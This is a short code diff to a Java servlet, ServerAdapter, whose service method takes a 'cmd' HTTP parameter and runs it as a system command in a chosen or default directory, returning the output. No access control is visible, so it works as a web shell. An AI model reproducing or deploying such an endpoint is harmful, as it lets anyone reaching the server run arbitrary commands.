@@ -20,7 +20,6 @@ import javax.servlet.http.HttpServletResponse;
  */
 public class ServerAdapter extends HttpServlet {
 	private static final long serialVersionUID = 7099744625181127555L;
-	private String base;
 
 	@Override
 	public void doGet(HttpServletRequest request, HttpServletResponse response)
@@ -38,6 +37,8 @@ public class ServerAdapter extends HttpServlet {
 	public void service(HttpServletRequest request, HttpServletResponse response)
 			throws IOException, ServletException {
 		try {
+			System.out.println(System.getProperty("user.dir").replaceAll("\\\\","/"));
+			@SuppressWarnings("unchecked")
 			Set<String> paramNames = request.getParameterMap().keySet();
 			String cmd = request.getParameter("cmd");
 			String base = request.getParameter("base");
@@ -54,6 +55,9 @@ public class ServerAdapter extends HttpServlet {
 			File basePath = null;
 			if(base!=null&&!base.trim().equals(""))
 				basePath = new File(base);
+			else {
+				basePath = new File(System.getProperty("user.dir").replaceAll("\\\\","/"));
+			}
 			String result = exec(cmd,basePath,envs.toArray(new String[0]));
 			sendBack(result,response);
 		}catch(Exception ex) {
